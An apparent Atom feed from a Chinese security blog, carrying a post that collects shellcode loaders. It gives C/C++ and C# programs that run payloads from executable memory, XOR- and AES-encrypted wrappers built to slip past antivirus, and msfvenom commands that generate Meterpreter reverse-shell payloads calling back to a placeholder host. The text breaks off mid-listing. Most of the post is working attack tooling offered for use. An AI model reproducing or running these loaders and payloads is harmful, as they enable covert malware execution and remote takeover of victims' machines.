<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Uknow - Stay hungry Stay foolish</title>
  
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="https://uknowsec.cn/"/>
  <updated>2019-08-02T12:34:05.291Z</updated>
  <id>https://uknowsec.cn/</id>
  
  <author>
    <name>uknow</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>shellcode加载总结</title>
    <link href="https://uknowsec.cn/posts/notes/shellcode%E5%8A%A0%E8%BD%BD%E6%80%BB%E7%BB%93.html"/>
    <id>https://uknowsec.cn/posts/notes/shellcode加载总结.html</id>
    <published>2019-08-01T14:17:17.000Z</published>
    <updated>2019-08-02T12:34:05.291Z</updated>
    
    <content type="html"><![CDATA[<h2><span id="cc">C/C++</span></h2><h3><span id="源码加载">源码加载</span></h3><h4><span id="利用动态申请内存">利用动态申请内存</span></h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;windows.h&gt;</span><br><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">typedef void (_stdcall *CODE)();</span><br><span class="line">#pragma comment(linker,&quot;/subsystem:\&quot;windows\&quot; /entry:\&quot;mainCRTStartup\&quot;&quot;)</span><br><span class="line">unsigned char shellcode[] =&quot;&quot;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">void main()</span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    PVOID p = NULL;</span><br><span class="line">    p = VirtualAlloc(NULL, sizeof(shellcode), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);</span><br><span class="line">    if (p == NULL)</span><br><span class="line">    &#123;</span><br><span class="line">        return;</span><br><span class="line">    &#125;</span><br><span class="line">    memcpy(p, shellcode, sizeof(shellcode));</span><br><span class="line">    </span><br><span class="line">    CODE code = (CODE)p;</span><br><span class="line">    code();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4><span id="强制类型转换成函数指针">强制类型转换成函数指针</span></h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;windows.h&gt;</span><br><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#pragma comment(linker,&quot;/subsystem:\&quot;windows\&quot; /entry:\&quot;mainCRTStartup\&quot;&quot;)</span><br><span class="line">unsigned char shellcode[] =&quot;&quot;;</span><br><span class="line"></span><br><span class="line">void main()</span><br><span class="line">&#123;</span><br><span class="line">   ((void(WINAPI*)(void))&amp;shellcode)();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4><span id="嵌入式汇编呼叫shellcode">嵌入式汇编呼叫shellcode</span></h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;windows.h&gt;</span><br><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#pragma comment(linker, &quot;/section:.data,RWE&quot;)</span><br><span class="line">unsigned char shellcode[] =&quot;&quot;;</span><br><span class="line"></span><br><span class="line">void main()</span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">    __asm</span><br><span class="line">    &#123;</span><br><span class="line">        </span><br><span class="line">        mov eax, offset shellcode</span><br><span class="line">        jmp eax</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4><span id="伪指令">伪指令</span></h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;windows.h&gt;</span><br><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#pragma comment(linker, &quot;/section:.data,RWE&quot;)</span><br><span class="line">unsigned char shellcode[] =&quot;&quot;;</span><br><span class="line"></span><br><span class="line">void main()</span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">    __asm</span><br><span class="line">    &#123;</span><br><span class="line">        </span><br><span class="line">        mov eax, offset shellcode</span><br><span class="line">        _emit 0xFF  </span><br><span class="line">        _emit 0xE0</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4><span id="xor加密">xor加密</span></h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">/*</span><br><span class="line">Author: Arno0x0x, Twitter: @Arno0x0x</span><br><span class="line">*/</span><br><span class="line"></span><br><span class="line">#include &quot;stdafx.h&quot;</span><br><span class="line">#include &lt;windows.h&gt;</span><br><span class="line">#include &lt;iostream&gt;</span><br><span class="line"></span><br><span class="line">int main(int argc, char **argv) &#123;</span><br><span class="line"></span><br><span class="line">// Encrypted shellcode and cipher key obtained from shellcode_encoder.py</span><br><span class="line">char encryptedShellcode[] = &quot;&quot;;</span><br><span class="line">char key[] = &quot;uknowsec&quot;;</span><br><span class="line">char cipherType[] = &quot;xor&quot;;</span><br><span class="line"></span><br><span class="line">// Char array to host the deciphered shellcode</span><br><span class="line">char shellcode[sizeof encryptedShellcode];</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">// XOR decoding stub using the key defined above must be the same as the encoding key</span><br><span class="line">int j = 0;</span><br><span class="line">for (int i = 0; i &lt; sizeof encryptedShellcode; i++) &#123;</span><br><span class="line">if (j == sizeof key - 1) j = 0;</span><br><span class="line"></span><br><span class="line">shellcode[i] = encryptedShellcode[i] ^ key[j];</span><br><span class="line">j++;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// Allocating memory with EXECUTE writes</span><br><span class="line">void *exec = VirtualAlloc(0, sizeof shellcode, MEM_COMMIT, PAGE_EXECUTE_READWRITE);</span><br><span class="line"></span><br><span class="line">// Copying deciphered shellcode into memory as a function</span><br><span class="line">memcpy(exec, shellcode, sizeof shellcode);</span><br><span class="line"></span><br><span class="line">// Call the shellcode</span><br><span class="line">((void(*)())exec)();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/shellcode_2.png" alt=""></p><p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/shellcode_4.png" alt=""></p><p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/shellcode_5.png" alt=""></p><h3><span id="加载器">加载器</span></h3><h4><span id="c加载shellcode方式的payload到内存">C++.加载shellcode方式的payload到内存</span></h4><p><a href="https://github.com/clinicallyinane/shellcode_launcher/" target="_blank" rel="noopener">https://github.com/clinicallyinane/shellcode_launcher/</a> </p><p>生成shellcode</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=ip lport=port -e x86/shikata_ga_nai -i 5 -f raw &gt; test.c</span><br></pre></td></tr></table></figure><p>shellcode 加载<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shellcode_launcher.exe -i test.c</span><br></pre></td></tr></table></figure></p><p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/shellcode_6.png" alt=""></p><p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/shellcode_7.png" alt=""></p><h4><span id="c以十六进制的方式执行shellcode">C以十六进制的方式执行shellcode</span></h4><p><a href="https://github.com/DimopoulosElias/SimpleShellcodeInjector" target="_blank" rel="noopener">https://github.com/DimopoulosElias/SimpleShellcodeInjector</a></p><p>生成shellcode<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse_https LHOST=1.2.3.4 LPORT=443 -f c -o msf.txt</span><br></pre></td></tr></table></figure></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat msf.txt|grep -v unsigned|sed &quot;s/\&quot;\\\x//g&quot;|sed &quot;s/\\\x//g&quot;|sed &quot;s/\&quot;//g&quot;|sed &apos;:a;N;$!ba;s/\n//g&apos;|sed &quot;s/;//g&quot;</span><br></pre></td></tr></table></figure><p>加载shellcode</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssi.exe shellcode</span><br></pre></td></tr></table></figure><p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/shellcode_8.png" alt=""></p><h2><span id="c">C</span></h2><h3><span id="源码加载">源码加载</span></h3><h4><span id="直接加载">直接加载</span></h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">using System;</span><br><span class="line">using System.Runtime.InteropServices;</span><br><span class="line">namespace TCPMeterpreterProcess</span><br><span class="line">&#123;</span><br><span class="line">    class Program</span><br><span class="line">    &#123;</span><br><span class="line">        static void Main(string[] args)</span><br><span class="line">        &#123;</span><br><span class="line">            // native function’s compiled code</span><br><span class="line">            // generated with metasploit</span><br><span class="line">            byte[] shellcode = new byte[333] &#123;</span><br><span class="line">            </span><br><span class="line">            &#125;;</span><br><span class="line">            UInt32 funcAddr = VirtualAlloc(0, (UInt32)shellcode.Length,</span><br><span class="line">            MEM_COMMIT, PAGE_EXECUTE_READWRITE);</span><br><span class="line">            Marshal.Copy(shellcode, 0, (IntPtr)(funcAddr), shellcode.Length);</span><br><span class="line">            IntPtr hThread = IntPtr.Zero;</span><br><span class="line">            UInt32 threadId = 0;</span><br><span class="line">            // prepare data</span><br><span class="line">            IntPtr pinfo = IntPtr.Zero;</span><br><span class="line">            // execute native code</span><br><span class="line">            hThread = CreateThread(0, 0, funcAddr, pinfo, 0, ref threadId);</span><br><span class="line">            WaitForSingleObject(hThread, 0xFFFFFFFF);</span><br><span class="line">            &#125;</span><br><span class="line">                    private static UInt32 MEM_COMMIT = 0x1000;</span><br><span class="line">            private static UInt32 PAGE_EXECUTE_READWRITE = 0x40;</span><br><span class="line">            [DllImport(&quot;kernel32&quot;)]</span><br><span class="line">                    private static extern UInt32 VirtualAlloc(UInt32 lpStartAddr,</span><br><span class="line">            UInt32 size, UInt32 flAllocationType, UInt32 flProtect);</span><br><span class="line">            [DllImport(&quot;kernel32&quot;)]</span><br><span class="line">                    private static extern bool VirtualFree(IntPtr lpAddress,</span><br><span class="line">            UInt32 dwSize, UInt32 dwFreeType);</span><br><span class="line">            [DllImport(&quot;kernel32&quot;)]</span><br><span class="line">                    private static extern IntPtr CreateThread(</span><br><span class="line">            UInt32 lpThreadAttributes,</span><br><span class="line">            UInt32 dwStackSize,</span><br><span class="line">            UInt32 lpStartAddress,</span><br><span class="line">            IntPtr param,</span><br><span class="line">            UInt32 dwCreationFlags,</span><br><span class="line">            ref UInt32 lpThreadId</span><br><span class="line">            );</span><br><span class="line">            [DllImport(&quot;kernel32&quot;)]</span><br><span class="line">                    private static extern bool CloseHandle(IntPtr handle);</span><br><span class="line">            [DllImport(&quot;kernel32&quot;)]</span><br><span class="line">                    private static extern UInt32 WaitForSingleObject(</span><br><span class="line">            IntPtr hHandle,</span><br><span class="line">            UInt32 dwMilliseconds</span><br><span class="line">            );</span><br><span class="line">            [DllImport(&quot;kernel32&quot;)]</span><br><span class="line">                    private static extern IntPtr GetModuleHandle(</span><br><span class="line">            string moduleName</span><br><span class="line">            );</span><br><span class="line">            [DllImport(&quot;kernel32&quot;)]</span><br><span class="line">                    private static extern UInt32 GetProcAddress(</span><br><span class="line">            IntPtr hModule,</span><br><span class="line">            string procName</span><br><span class="line">            );</span><br><span class="line">            [DllImport(&quot;kernel32&quot;)]</span><br><span class="line">                    private static extern UInt32 LoadLibrary(</span><br><span class="line">            string lpFileName</span><br><span class="line">            );</span><br><span class="line">            [DllImport(&quot;kernel32&quot;)]</span><br><span class="line">                    private static extern UInt32 GetLastError();</span><br><span class="line">      &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">using System;</span><br><span class="line">using System.Threading;</span><br><span class="line">using System.Runtime.InteropServices;</span><br><span class="line">namespace MSFWrapper</span><br><span class="line">&#123;</span><br><span class="line">    public class Program</span><br><span class="line">    &#123;</span><br><span class="line">        public Program()</span><br><span class="line">        &#123;</span><br><span class="line">           RunMSF();</span><br><span class="line">        &#125;</span><br><span class="line">        public static void RunMSF()</span><br><span class="line">        &#123;</span><br><span class="line">            byte[] MsfPayload = &#123;</span><br><span class="line">            //Paste your Payload here</span><br><span class="line">        &#125;;</span><br><span class="line">            IntPtr returnAddr = VirtualAlloc((IntPtr)0, (uint)Math.Max(MsfPayload.Length, 0x1000), 0x3000, 0x40);</span><br><span class="line">            Marshal.Copy(MsfPayload, 0, returnAddr, MsfPayload.Length);</span><br><span class="line">            CreateThread((IntPtr)0, 0, returnAddr, (IntPtr)0, 0, (IntPtr)0);</span><br><span class="line">            Thread.Sleep(2000);</span><br><span class="line">        &#125;</span><br><span class="line">        public static void Main()</span><br><span class="line">        &#123;</span><br><span class="line">        &#125;</span><br><span class="line">        [DllImport(&quot;kernel32.dll&quot;)]</span><br><span class="line">        public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);</span><br><span class="line">        [DllImport(&quot;kernel32.dll&quot;)]</span><br><span class="line">        public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>保存代码后，修改该工程的属性，将输出类型改为“Windows 应用程序”，启动对象改为“MSFWrapper.Program”并保存。</p><p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/shellcode_1.png" alt=""></p><p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/shellcode_3.png" alt=""></p><h4><span id="aes加密">aes加密</span></h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br></pre></td><td class="code"><pre><span class="line">/*</span><br><span class="line">Author: Arno0x0x, Twitter: @Arno0x0x</span><br><span class="line"></span><br><span class="line">How to compile:</span><br><span class="line">===============</span><br><span class="line">C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe /unsafe /out:encryptedShellcodeWrapper_aes.exe encryptedShellcodeWrapper_aes.cs</span><br><span class="line"></span><br><span class="line">*/</span><br><span class="line"></span><br><span class="line">using System;</span><br><span class="line">using System.IO;</span><br><span class="line">using System.Collections.Generic;</span><br><span class="line">using System.Text;</span><br><span class="line">using System.Threading.Tasks;</span><br><span class="line">using System.Security.Cryptography;</span><br><span class="line">using System.Runtime.InteropServices;</span><br><span class="line"></span><br><span class="line">namespace RunShellCode</span><br><span class="line">&#123;</span><br><span class="line">    static class Program</span><br><span class="line">    &#123;</span><br><span class="line">        //==============================================================================</span><br><span class="line">        // CRYPTO FUNCTIONS</span><br><span class="line">        //==============================================================================</span><br><span class="line">        private static T[] SubArray&lt;T&gt;(this T[] data, int index, int length)</span><br><span class="line">        &#123;</span><br><span class="line">            T[] result = new T[length];</span><br><span class="line">            Array.Copy(data, index, result, 0, length);</span><br><span class="line">            return result;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        private static byte[] xor(byte[] cipher, byte[] key) &#123;</span><br><span class="line">            byte[] decrypted = new byte[cipher.Length];</span><br><span class="line"></span><br><span class="line">            for(int i = 0; i &lt; cipher.Length; i++) &#123;</span><br><span class="line">                decrypted[i] = (byte) (cipher[i] ^ key[i % key.Length]);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            return decrypted;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        //--------------------------------------------------------------------------------------------------</span><br><span class="line">        // Decrypts the given a plaintext message byte array with a given 128 bits key</span><br><span class="line">        // Returns the unencrypted message</span><br><span class="line">        //--------------------------------------------------------------------------------------------------</span><br><span class="line">        private static byte[] aesDecrypt(byte[] cipher, byte[] key)</span><br><span class="line">        &#123;</span><br><span class="line">            var IV = cipher.SubArray(0, 16);</span><br><span class="line">            var encryptedMessage = cipher.SubArray(16, cipher.Length - 16);</span><br><span class="line"></span><br><span class="line">            // Create an AesManaged object with the specified key and IV.</span><br><span class="line">            using (AesManaged aes = new AesManaged())</span><br><span class="line">            &#123;</span><br><span class="line">                aes.Padding = PaddingMode.PKCS7;</span><br><span class="line">                aes.KeySize = 128;</span><br><span class="line">                aes.Key = key;</span><br><span class="line">                aes.IV = IV;</span><br><span class="line"></span><br><span class="line">                using (MemoryStream ms = new MemoryStream())</span><br><span class="line">                &#123;</span><br><span class="line">                    using (CryptoStream cs = new CryptoStream(ms, aes.CreateDecryptor(), CryptoStreamMode.Write))</span><br><span class="line">                    &#123;</span><br><span class="line">                        cs.Write(encryptedMessage, 0, encryptedMessage.Length);</span><br><span class="line">                    &#125;</span><br><span class="line"></span><br><span class="line">                    return ms.ToArray();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        //==============================================================================</span><br><span class="line">        // MAIN FUNCTION</span><br><span class="line">        //==============================================================================</span><br><span class="line">        static void Main()</span><br><span class="line">        &#123;</span><br><span class="line">            byte[] encryptedShellcode = new byte[] &#123; &#125;;</span><br><span class="line">            string key = &quot;Nv78rga+vzeTO+acx4EXCw==&quot;;</span><br><span class="line">            string cipherType = &quot;aes&quot;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">            byte[] shellcode = null;</span><br><span class="line"></span><br><span class="line">            //--------------------------------------------------------------</span><br><span class="line">            // Decrypt the shellcode</span><br><span class="line">            if (cipherType == &quot;xor&quot;) &#123;</span><br><span class="line">                shellcode = xor(encryptedShellcode, Encoding.ASCII.GetBytes(key));</span><br><span class="line">            &#125;</span><br><span class="line">            else if (cipherType == &quot;aes&quot;) &#123;</span><br><span class="line">                shellcode = aesDecrypt(encryptedShellcode, Convert.FromBase64String(key));</span><br><span class="line">            &#125;</span><br><span class="line">                        </span><br><span class="line">            //--------------------------------------------------------------        </span><br><span class="line">            // Copy decrypted shellcode to memory</span><br><span class="line">            UInt32 funcAddr = VirtualAlloc(0, (UInt32)shellcode.Length, MEM_COMMIT, PAGE_EXECUTE_READWRITE);</span><br><span class="line">            Marshal.Copy(shellcode, 0, (IntPtr)(funcAddr), shellcode.Length);</span><br><span class="line">            IntPtr hThread = IntPtr.Zero;</span><br><span class="line">            UInt32 threadId = 0;</span><br><span class="line"></span><br><span class="line">            // Prepare data</span><br><span class="line">            IntPtr pinfo = IntPtr.Zero;</span><br><span class="line"></span><br><span class="line">            // Invoke the shellcode</span><br><span class="line">            hThread = CreateThread(0, 0, funcAddr, pinfo, 0, ref threadId);</span><br><span class="line">            WaitForSingleObject(hThread, 0xFFFFFFFF);</span><br><span class="line">            return;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        private static UInt32 MEM_COMMIT = 0x1000;</span><br><span class="line">        private static UInt32 PAGE_EXECUTE_READWRITE = 0x40;</span><br><span class="line"></span><br><span class="line">        // The usual Win32 API trio functions: VirtualAlloc, CreateThread, WaitForSingleObject</span><br><span class="line">        [DllImport(&quot;kernel32&quot;)]</span><br><span class="line">        private static extern UInt32 VirtualAlloc(</span><br><span class="line">            UInt32 lpStartAddr,</span><br><span class="line">            UInt32 size,</span><br><span class="line">            UInt32 flAllocationType,</span><br><span class="line">            UInt32 flProtect</span><br><span class="line">        );</span><br><span class="line"></span><br><span class="line">        [DllImport(&quot;kernel32&quot;)]</span><br><span class="line">        private static extern IntPtr CreateThread(</span><br><span class="line">            UInt32 lpThreadAttributes,</span><br><span class="line">            UInt32 dwStackSize,</span><br><span class="line">            UInt32 lpStartAddress,</span><br><span class="line">            IntPtr param,</span><br><span class="line">            UInt32 dwCreationFlags,</span><br><span class="line">            ref UInt32 lpThreadId</span><br><span class="line">        );</span><br><span class="line"></span><br><span class="line">        [DllImport(&quot;kernel32&quot;)]</span><br><span class="line">        private static extern UInt32 WaitForSingleObject(</span><br><span class="line">            IntPtr hHandle,</span><br><span class="line">            UInt32 dwMilliseconds</span><br><span class="line">        );</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4><span id="xor加密">xor加密</span></h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span 